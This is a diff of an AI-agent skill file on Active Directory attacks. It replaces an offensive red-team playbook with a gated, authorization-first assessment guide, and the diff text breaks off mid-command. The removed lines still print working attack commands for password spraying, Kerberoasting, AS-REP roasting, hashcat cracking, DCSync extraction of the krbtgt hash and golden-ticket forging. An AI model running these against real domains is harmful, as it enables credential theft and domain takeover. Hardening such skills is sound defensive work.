@@ -1,9 +1,9 @@
 ---
 name: active-directory-attacks
-description: Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and doma
+description: Assess Active Directory attack paths using scoped configuration review and controlled synthetic lab validation; identify prerequisites, evidence and mitigations. 
 category: Security & Systems
 source: antigravity
-tags: [python, ai, llm, workflow, template, document, security, vulnerability, cro]
+tags: [ai, llm, workflow, template, document, security, vulnerability, cro]
 url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/active-directory-attacks
 ---
 
@@ -22,179 +22,40 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/acti
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-<!-- security-allowlist: credential-extraction, kerberos-attacks -->
 
-# Active Directory Attacks
+# Active Directory Attack-Path Assessment
 
-## Purpose
+## When to Use
 
-Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.
+For explicitly authorized AD security assessments or isolated training labs. Start with supplied configuration and owner evidence, then choose the smallest permitted validation. This document does not provide tools, credentials, a licensed lab or a verified exploit chain.
 
-## Inputs/Prerequisites
+## Mandatory confirmation gate
 
-- Kali Linux or Windows attack platform
-- Domain user credentials (for most attacks)
-- Network access to Domain Controller
-- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec
+Before probing, authentication, collection, ticket requests, credential access, coercion, exploitation or configuration changes, obtain the exact domain/controllers/hosts/accounts, written owner authorization and permitted techniques, timing and lockout/request limits. Show the exact proposed operation and its expected effect; wait for explicit confirmation in this conversation. No confirmation means supplied-evidence analysis only. Credentials or a tool installation are not authorization.
 
-## Outputs/Deliverables
+Keep production secrets and privileged identities out of exercises. Prefer synthetic users, service accounts, tickets, certificates and canary resources in a disposable owner lab. Never default to password sprays, DCSync/krbtgt extraction, credential dumps, remote shells, machine-password resets, malicious updates, persistence or using another user's ticket. Stop on unexpected real data or cross-domain scope.
 
-- Domain enumeration data
-- Extracted credentials and hashes
-- Kerberos tickets for impersonation
-- Domain Administrator access
-- Persistent access mechanisms
+## Evidence workflow
 
----
+1. Record immutable scope and owner-supplied topology: domains/forests/trusts, domain-controller and client patch/configuration state, relevant privileges, service accounts and certificate services. Note missing evidence.
+2. Map the candidate principal → permission → resource → possible action. Confirm effective groups/ACL inheritance, denied rights, authentication conditions, host access and actual controls; an attack-graph edge is a hypothesis.
+3. Identify the specific technique's preconditions using [the advanced reference](references/advanced-attacks.md). Separate credential disclosure, authentication, execution and privileged state change; one does not automatically prove the next.
+4. If active validation is authorized, propose a bounded lab operation with a synthetic marker and a control case. Set stop/cleanup conditions, request/time budget and a reviewer-visible observation before execution. Do not install a historical tool or collector unreviewed.
+5. Report exact evidence, limits and mitigation. Owner-approved remediation and retest are separate actions.
 
-## Essential Tools
+## Core checks
 
-| Tool | Purpose |
-|------|---------|
-| BloodHound | AD attack path visualization |
-| Impacket | Python AD attack tools |
-| Mimikatz | Credential extraction |
-| Rubeus | Kerberos attacks |
-| CrackMapExec | Network exploitation |
-| PowerView | AD enumeration |
-| Responder | LLMNR/NBT-NS poisoning |
+| Area | Inspect | Avoid this false conclusion |
+| --- | --- | --- |
+| Kerberos | Configured clock-skew allowance, time source, encryption types and service principals | A universal five-minute rule or fixed date command safely repairs time |
+| Account exposure | Authorized SPN/preauthentication/account policy inventory and owner access review | Empty tool output proves no service accounts or exposure |
+| Replication privileges | Effective directory replication rights and who can exercise them | One named replication right or a successful login proves DCSync eligibility |
+| Ticket abuse | Origin and intended identity of synthetic tickets, actual validation policy | Pass-the-ticket and forging a golden ticket are the same operation |
+| Relay | Signing/channel binding/extended protection, protocol and target permissions | Failed SMB relay authorizes switching to LDAP or another target |
+| AD CS | Template and CA permissions, enrollment/approval, EKUs/subject/mapping policy | One template flag alone proves arbitrary administrator impersonation |
+| Known CVEs | Exact product, installed patch/configuration and vendor advisory prerequisites | RPC exposure or a version banner alone proves vulnerability |
 
----
+BloodHound collection can contact many hosts and disclose sensitive topology. Agree collector version, collection methods and scope rather than running All by default. Do not launch browser tools with sandbox disabled as routine setup. Modern and legacy BloodHound/collector versions have different deployment and query formats. Tools named in older playbooks may be retired, renamed or incompatible; inspect official release/help in a safe environment and do not infer current flags from this document.
 
-## Core Workflow
-
-### Step 1: Kerberos Clock Sync
-
-Kerberos requires clock synchronization (±5 minutes):
-
-```bash
-# Detect clock skew
-nmap -sT 10.10.10.10 -p445 --script smb2-time
-
-# Fix clock on Linux
-sudo date -s "14 APR 2024 18:25:16"
-
-# Fix clock on Windows
-net time /domain /set
-
-# Fake clock without changing system time
-faketime -f '+8h' <command>
-```
-
-### Step 2: AD Reconnaissance with BloodHound
-
-```bash
-# Start BloodHound
-neo4j console
-bloodhound --no-sandbox
-
-# Collect data with SharpHound
-.\SharpHound.exe -c All
-.\SharpHound.exe -c All --ldapusername user --ldappassword pass
-
-# Python collector (from Linux)
-bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
-```
-
-### Step 3: PowerView Enumeration
-
-```powershell
-# Get domain info
-Get-NetDomain
-Get-DomainSID
-Get-NetDomainController
-
-# Enumerate users
-Get-NetUser
-Get-NetUser -SamAccountName targetuser
-Get-UserProperty -Properties pwdlastset
-
-# Enumerate groups
-Get-NetGroupMember -GroupName "Domain Admins"
-Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member
-
-# Find local admin access
-Find-LocalAdminAccess -Verbose
-
-# User hunting
-Invoke-UserHunter
-Invoke-UserHunter -Stealth
-```
-
----
-
-## Credential Attacks
-
-### Password Spraying
-
-```bash
-# Using kerbrute
-./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
-
-# Using CrackMapExec
-crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
-```
-
-### Kerberoasting
-
-Extract service account TGS tickets and crack offline:
-
-```bash
-# Impacket
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
-
-# Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.txt
-
-# CrackMapExec
-crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt
-
-# Crack with hashcat
-hashcat -m 13100 hashes.txt rockyou.txt
-```
-
-### AS-REP Roasting
-
-Target accounts with "Do not require Kerberos preauthentication":
-
-```bash
-# Impacket
-GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
-
-# Rubeus
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
-
-# Crack with hashcat
-hashcat -m 18200 hashes.txt rockyou.txt
-```
-
-### DCSync Attack
-
-Extract credentials directly from DC (requires Replicating Directory Changes rights):
-
-```bash
-# Impacket
-secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt
-
-# Mimikatz
-lsadump::dcsync /domain:domain.local /user:krbtgt
-lsadump::dcsync /domain:domain.local /user:Administrator
-```
-
----
-
-## Kerberos Ticket Attacks
-
-### Pass-the-Ticket (Golden Ticket)
-
-Forge TGT with krbtgt hash for any user:
-
-```powershell
-# Get krbtgt hash via DCSync first
-# Mimikatz - Create Golden Ticket
-kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt
-
-# Impacket
-ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain 
+## Controlled example
